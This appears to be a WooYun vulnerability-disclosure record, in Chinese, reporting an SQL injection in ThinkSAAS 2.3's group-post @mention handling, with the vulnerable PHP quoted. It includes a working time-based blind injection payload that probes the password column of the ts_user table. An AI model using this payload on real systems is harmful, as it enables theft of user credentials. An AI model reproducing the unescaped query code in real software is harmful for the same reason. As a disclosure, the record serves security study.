{"id": 40267, "wybug_id": "wooyun-2015-092019", "wybug_title": "ThinkSAAS 2.3 SQL注入", "wybug_corp": "thinksaas.cn", "wybug_author": "Th1nk", "wybug_date": "2015-01-15 17:45", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-20：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： ThinkSAAS 2.3 SQL注入 详细说明：  app/group/action/add.php172-197行\n// 处理@用户名\t\tif (preg_match_all ( '/@/', $content, $at )) {\t\t\techo $content;\t\t\tpreg_match_all ( \"/@(.+?)([\\s|:]|$)/is\", $content, $matches );\t\t\t$unames = $matches [1];\t\t\t\t\t\t$ns = \"'\" . implode ( \"','\", $unames ) . \"'\";\t\t\t$csql = \"username IN($ns)\";\t\t\t\t\t\tif ($unames) {\t\t\t\t\t\t\t\t$query = $db->fetch_all_assoc ( \"select userid,username from \" . dbprefix . \"user_info where $csql\" );\t\t\t\tforeach ( $query as $v ) {\t\t\t\t\t$content = str_replace ( '@' . $v ['username'] . '', '[@' . $v ['username'] . ':' . $v ['userid'] . ']', $content );\t\t\t\t\t$msg_content = '我在帖子中提到了你<br />去看看：' . tsUrl ( 'group', 'topic', array (\t\t\t\t\t\t\t'id' => $topicid \t\t\t\t\t) );\t\t\t\t\taac ( 'message' )->sendmsg ( $userid, $v ['userid'], $msg_content );\t\t\t\t}\t\t\t\t$new ['group']->update ( 'group_topic', array (\t\t\t\t\t\t'topicid' => $topicid \t\t\t\t), array (\t\t\t\t\t\t'content' => $content \t\t\t\t) );\t\t\t}\t\t}\n正则匹配出$content中的用户名，然后执行sql语句\n$query = $db->fetch_all_assoc ( \"select userid,username from \" . dbprefix . \"user_info where $csql\" );\n看看$content怎么来的\n$content =  tsClean( $_POST ['content'] );\n跟入tsclean函数\nfunction tsClean($text) {\t$text = stripslashes(trim($text));\t//去除前后空格，并去除反斜杠\t//$text = br2nl($text); //将br转换成/n\t///////XSS start\trequire_once 'thinksaas/xsshtml.class.php';\t$xss = new XssHtml($text);\t$text = $xss -> getHtml();\t//$text = substr ($text, 4);//去除左边<p>标签\t//$text = substr ($text, 0,-5);//去除右边</p>标签\t///////XSS end\t//$text = html_entity_decode($text,ENT_NOQUOTES,\"utf-8\");//把 HTML 实体转换为字符\t//$text = strip_tags($text); //去掉HTML及PHP标记\t//$text = cleanJs ( $text );\t$text = htmlentities($text, ENT_NOQUOTES, \"utf-8\");\t//把字符转换为 HTML 实体\treturn $text;}\n可以看到去掉了反斜杠，也就是把全局的反斜杠去掉了，于是这里造成一个注入。   漏洞证明：  然后是演示，为了方便演示，我把sql语句打印出来。因为涉及到token的问题，先访问http://127.0.0.1/index.php?app=article&ac=add提交文章的时候抓包，获取到token因为没有找到回显的地方，这里采取时间盲注。\n\n因为空格是正则匹配的分隔符，所以不能用空格这里采用/**/代替空格。成功延时。\n\ncontent为\n123@12')/**/or/**/if(((select/**/length((select/**/pwd/**/from/**/ts_user/**/limit/**/1)))=32),sleep(2),0)#3:\n可以查数据几个比较坑的地方提一下，因为每次都是先插入文章名，然后再执行注入，所以说要每次输入不同的title（当然，写脚本随机数一下就好了）。还有就是因为被html实体化过了，不能输入大于小于号，所以只能用“=”慢慢匹配。当然这并不影响注入。剩下的就交给你们啦~   修复方案：  过滤过滤   版权声明：转载请注明来源 Th1nk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}